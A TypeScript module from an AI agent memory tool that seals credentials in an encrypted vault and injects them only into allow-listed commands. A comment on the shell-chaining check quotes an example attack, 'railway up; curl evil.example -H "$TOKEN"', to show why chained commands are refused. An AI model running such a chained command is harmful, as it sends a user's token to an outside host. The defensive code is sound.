// Copyright 2026 Robert Winter / Complete Ideas
// SPDX-License-Identifier: Apache-2.0
/**
 * The vault: AWM knows a secret without telling it (S1b, docs/vault.md).
 *
 * Write-time redaction (S1) found credentials and destroyed them. That protects them, but a
 * memory that forgets what it knows is not much of a memory: the point of remembering the
 * Railway token is being able to deploy with it next week. The vault keeps the value and
 * changes who it is TOLD to:
 *
 *   - the memory keeps a handle — `[VAULT:railway_api_token …a1b2 #3f9c2e71b0d4]` — so a
 *     recall still answers "do I know this, and what is it for";
 *   - the value is sealed (AES-256-GCM) in `vault.db`, a separate file next to the store, so
 *     an export, backup or recall trace of memory.db never carries it;
 *   - the key is not in either file: it lives in the operating system's credential store
 *     (Windows Credential Manager, macOS Keychain, Secret Service on Linux), unlocked by the
 *     user's own login. Where none is available it falls back to a key file beside the
 *     store — weaker, and said so;
 *   - a value comes back out only (a) into the environment of a command the user has
 *     allowed (`awm vault run`), with the value scrubbed from that command's output, or
 *     (b) to a human at an interactive terminal (`awm vault reveal`). There is no MCP tool
 *     that returns a value: whatever the model reads lands in the transcript.
 *
 * Synchronous on purpose: redaction runs inside synchronous code paths, and better-sqlite3,
 * node:crypto and the keyring binding are all synchronous.
 *
 * Environment:
 *   AWM_VAULT            off (default) | on        — opt-in; off keeps S1's mask-and-forget
 *   AWM_VAULT_PATH       path to vault.db           — default: beside the memory store
 *   AWM_VAULT_KEY_STORE  keyring (default) | file   — file forces the key-file fallback
 */

import Database from 'better-sqlite3';
import { createCipheriv, createDecipheriv, createHmac, randomBytes } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, writeFileSync, chmodSync } from 'node:fs';
import { createRequire } from 'node:module';
import { dirname, join, resolve } from 'node:path';

const KEYRING_SERVICE = 'agent-working-memory';

export interface VaultItem {
  id: string;
  type: string;
  last4: string;
  /** The words around the value when it was sealed, with the value itself masked. */
  label: string;
  createdAt: string;
  lastUsedAt: string | null;
  useCount: number;
  /** Command prefixes this value may be injected into without asking. */
  allow: string[];
}

export type KeyStore = 'keyring' | 'file';

interface Row {
  id: string; type: string; last4: string; label: string; ciphertext: Buffer; iv: Buffer; tag: Buffer;
  fingerprint: string; created_at: string; last_used_at: string | null; use_count: number; allow: string;
}

export class Vault {
  readonly path: string;
  readonly keyStore: KeyStore;
  private readonly db: Database.Database;
  private readonly key: Buffer;

  constructor(vaultPath: string, opts: { keyStore?: KeyStore } = {}) {
    this.path = resolve(vaultPath);
    mkdirSync(dirname(this.path), { recursive: true });
    const { key, keyStore } = loadOrCreateKey(this.path, opts.keyStore ?? envKeyStore());
    this.key = key;
    this.keyStore = keyStore;
    this.db = new Database(this.path);
    this.db.pragma('journal_mode = WAL');
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS vault_items (
        id TEXT PRIMARY KEY,
        type TEXT NOT NULL,
        last4 TEXT NOT NULL,
        label TEXT NOT NULL DEFAULT '',
        ciphertext BLOB NOT NULL,
        iv BLOB NOT NULL,
        tag BLOB NOT NULL,
        fingerprint TEXT NOT NULL UNIQUE,
        created_at TEXT NOT NULL DEFAULT (datetime('now')),
        last_used_at TEXT,
        use_count INTEGER NOT NULL DEFAULT 0,
        allow TEXT NOT NULL DEFAULT '[]'
      );
    `);
  }

  /**
   * Seal a value and return its handle text. The same value sealed twice returns the same
   * handle (matched by an HMAC fingerprint, never by comparing plaintext), so a token pasted
   * into ten memories is one vault item.
   */
  seal(value: string, type: string, label = ''): string {
    const fingerprint = createHmac('sha256', this.key).update(value).digest('hex');
    const existing = this.db.prepare('SELECT id, type, last4 FROM vault_items WHERE fingerprint = ?').get(fingerprint) as
      { id: string; type: string; last4: string } | undefined;
    if (existing) return handleText(existing.type, existing.last4, existing.id);

    const id = fingerprint.slice(0, 12);
    const iv = randomBytes(12);
    const cipher = createCipheriv('aes-256-gcm', this.key, iv);
    const ciphertext = Buffer.concat([cipher.update(value, 'utf8'), cipher.final()]);
    const last4 = value.length >= 12 ? value.slice(-4) : '';
    this.db.prepare(`INSERT INTO vault_items (id, type, last4, label, ciphertext, iv, tag, fingerprint)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`)
      .run(id, type, last4, label.slice(0, 200), ciphertext, iv, cipher.getAuthTag(), fingerprint);
    this.known = null;
    return handleText(type, last4, id);
  }

  private known: Array<{ value: string; handle: string }> | null = null;

  /**
   * Every sealed value, decrypted once and held in this process, longest first. Once AWM
   * knows a secret it must recognise it wherever it turns up again — the live-store
   * rehearsal found the same passwords in 20–40 later memories with no label for the
   * shape rules to see. Values too ordinary to replace safely (under 8 characters, or a
   * plain word) are left out: replacing "nothing" everywhere would damage real text.
   */
  knownSecrets(): Array<{ value: string; handle: string }> {
    if (this.known) return this.known;
    this.known = (this.db.prepare('SELECT id, type, last4 FROM vault_items').all() as Array<{ id: string; type: string; last4: string }>)
      .map((r) => ({ value: this.open(r.id), handle: handleText(r.type, r.last4, r.id) }))
      .filter((k) => k.value.length >= 8 && !/^[A-Za-z]+$/.test(k.value))
      .sort((a, b) => b.value.length - a.value.length);
    return this.known;
  }

  /**
   * Decrypt. Deliberately NOT exported through any MCP tool — callers are `awm vault run`
   * (into a child process environment) and `awm vault reveal` (to an interactive human).
   */
  open(id: string): string {
    const row = this.row(id);
    const decipher = createDecipheriv('aes-256-gcm', this.key, row.iv);
    decipher.setAuthTag(row.tag);
    return Buffer.concat([decipher.update(row.ciphertext), decipher.final()]).toString('utf8');
  }

  get(id: string): VaultItem | null {
    const row = this.db.prepare('SELECT * FROM vault_items WHERE id = ?').get(normaliseId(id)) as Row | undefined;
    return row ? toItem(row) : null;
  }

  list(): VaultItem[] {
    return (this.db.prepare('SELECT * FROM vault_items ORDER BY created_at DESC').all() as Row[]).map(toItem);
  }

  allow(id: string, prefix: string): void {
    const item = this.require(id);
    const allow = [...new Set([...item.allow, prefix.trim()])];
    this.db.prepare('UPDATE vault_items SET allow = ? WHERE id = ?').run(JSON.stringify(allow), item.id);
  }

  disallow(id: string, prefix: string): void {
    const item = this.require(id);
    const allow = item.allow.filter((p) => p !== prefix.trim());
    this.db.prepare('UPDATE vault_items SET allow = ? WHERE id = ?').run(JSON.stringify(allow), item.id);
  }

  /** True when `command` starts with an allowed prefix and carries no shell chaining. */
  isAllowed(id: string, command: string): boolean {
    const item = this.require(id);
    if (hasShellChaining(command)) return false;
    const c = command.trim();
    return item.allow.some((p) => c === p || c.startsWith(`${p} `));
  }

  recordUse(id: string): void {
    this.db.prepare(`UPDATE vault_items SET use_count = use_count + 1, last_used_at = datetime('now') WHERE id = ?`)
      .run(normaliseId(id));
  }

  forget(id: string): boolean {
    this.known = null;
    return this.db.prepare('DELETE FROM vault_items WHERE id = ?').run(normaliseId(id)).changes > 0;
  }

  close(): void {
    this.db.close();
  }

  private row(id: string): Row {
    const row = this.db.prepare('SELECT * FROM vault_items WHERE id = ?').get(normaliseId(id)) as Row | undefined;
    if (!row) throw new Error(`No vault item ${id}`);
    return row;
  }

  private require(id: string): VaultItem {
    const item = this.get(id);
    if (!item) throw new Error(`No vault item ${id}`);
    return item;
  }
}

/** `[VAULT:stripe_key …0dWz #3f9c2e71b0d4]` — what the memory holds instead of the value. */
export function handleText(type: string, last4: string, id: string): string {
  return last4 ? `[VAULT:${type} …${last4} #${id}]` : `[VAULT:${type} #${id}]`;
}

/** Every vault id mentioned in a piece of text. */
export function vaultIdsIn(text: string): string[] {
  return [...text.matchAll(/\[VAULT:[a-z_]+(?: …[^\s#\]]{1,4})? #([0-9a-f]{12})\]/g)].map((m) => m[1]!);
}

/**
 * `;`, `&&`, `|`, backticks, `$(`, redirects, newlines. A prefix allow-list means nothing if
 * `railway up; curl evil.example -H "$TOKEN"` passes as "starts with railway up".
 */
export function hasShellChaining(command: string): boolean {
  return /[;&|`<>\n\r]|\$\(/.test(command);
}

/** Replace every occurrence of `value` in `text` with `replacement`. */
export function scrub(text: string, value: string, replacement: string): string {
  if (!value || value.length < 4) return text;
  return text.split(value).join(replacement);
}

function normaliseId(id: string): string {
  return id.replace(/^#/, '').trim().toLowerCase();
}

function toItem(row: Row): VaultItem {
  let allow: string[] = [];
  try { allow = JSON.parse(row.allow); } catch { /* keep empty */ }
  return {
    id: row.id, type: row.type, last4: row.last4, label: row.label, createdAt: row.created_at,
    lastUsedAt: row.last_used_at, useCount: row.use_count, allow,
  };
}

function envKeyStore(): KeyStore {
  return process.env.AWM_VAULT_KEY_STORE?.trim().toLowerCase() === 'file' ? 'file' : 'keyring';
}

/**
 * The OS keyring binding is an optional dependency: a platform without a prebuilt binary
 * (or a headless Linux box with no Secret Service) still gets a working vault.
 */
function keyringEntry(account: string): { getPassword(): string | null; setPassword(p: string): void; deletePassword(): boolean } | null {
  try {
    const require = createRequire(import.meta.url);
    const { Entry } = require('@napi-rs/keyring') as { Entry: new (s: string, a: string) => any };
    const entry = new Entry(KEYRING_SERVICE, account);
    entry.getPassword(); // probes that a backend is reachable
    return entry;
  } catch {
    return null;
  }
}

function loadOrCreateKey(vaultPath: string, preferred: KeyStore): { key: Buffer; keyStore: KeyStore } {
  // One keyring entry per vault file, so a test vault never touches the real one.
  const account = `vault-key:${vaultPath.toLowerCase()}`;
  if (preferred === 'keyring') {
    const entry = keyringEntry(account);
    if (entry) {
      const stored = entry.getPassword();
      if (stored) return { key: Buffer.from(stored, 'base64'), keyStore: 'keyring' };
      // A vault that already has items but whose key is gone cannot be opened again —
      // refuse rather than silently minting a new key that decrypts nothing.
      if (existsSync(vaultPath) && hasItems(vaultPath)) {
        throw new Error(`The vault key for ${vaultPath} is missing from the OS credential store; the sealed values cannot be opened.`);
      }
      const key = randomBytes(32);
      entry.setPassword(key.toString('base64'));
      return { key, keyStore: 'keyring' };
    }
  }
  const keyFile = join(dirname(vaultPath), 'vault.key');
  if (existsSync(keyFile)) return { key: Buffer.from(readFileSync(keyFile, 'utf8').trim(), 'base64'), keyStore: 'file' };
  const key = randomBytes(32);
  writeFileSync(keyFile, key.toString('base64'), { mode: 0o600 });
  try { chmodSync(keyFile, 0o600); } catch { /* best effort on Windows */ }
  return { key, keyStore: 'file' };
}

function hasItems(vaultPath: string): boolean {
  try {
    const db = new Database(vaultPath, { readonly: true });
    const n = (db.prepare(`SELECT count(*) AS n FROM sqlite_master WHERE name = 'vault_items'`).get() as { n: number }).n
      ? (db.prepare('SELECT count(*) AS n FROM vault_items').get() as { n: number }).n
      : 0;
    db.close();
    return n > 0;
  } catch {
    return false;
  }
}

/** Delete this vault's key from the OS credential store (tests, `awm vault destroy`). */
export function deleteVaultKey(vaultPath: string): void {
  const entry = keyringEntry(`vault-key:${resolve(vaultPath).toLowerCase()}`);
  try { entry?.deletePassword(); } catch { /* already gone */ }
}

// ─── The process-wide vault the store writes through ─────────────────────────

let active: Vault | null = null;

/**
 * Opt-in (Robert, 2026-10-28: "an optional flag that can be turned on and off"). Off, a
 * secret is masked and forgotten exactly as in S1; on, it is sealed and a handle is kept.
 */
export function vaultEnabled(): boolean {
  const v = process.env.AWM_VAULT?.trim().toLowerCase();
  return v === 'on' || v === '1' || v === 'true';
}

/** The vault path for a memory store path: beside it, unless AWM_VAULT_PATH says otherwise. */
export function vaultPathFor(storePath: string): string {
  if (process.env.AWM_VAULT_PATH) return resolve(process.env.AWM_VAULT_PATH);
  const p = resolve(storePath);
  // SQLite stores are a file; PGlite stores are a directory.
  return existsSync(p) && !p.endsWith('.db') ? join(p, 'vault.db') : join(dirname(p), 'vault.db');
}

/** Open the process-wide vault. A failure leaves sealing off and redaction masking, never a lost write. */
export function initVault(storePath: string): Vault | null {
  if (!vaultEnabled()) return null;
  try {
    active = new Vault(vaultPathFor(storePath));
  } catch (err) {
    process.stderr.write(`[awm] vault unavailable, secrets will be masked instead of sealed: ${(err as Error).message}\n`);
    active = null;
  }
  return active;
}

export function getVault(): Vault | null {
  return vaultEnabled() ? active : null;
}

/** Point redaction at a specific vault (tests, `awm vault migrate`). */
export function setActiveVault(v: Vault | null): void {
  active = v;
}
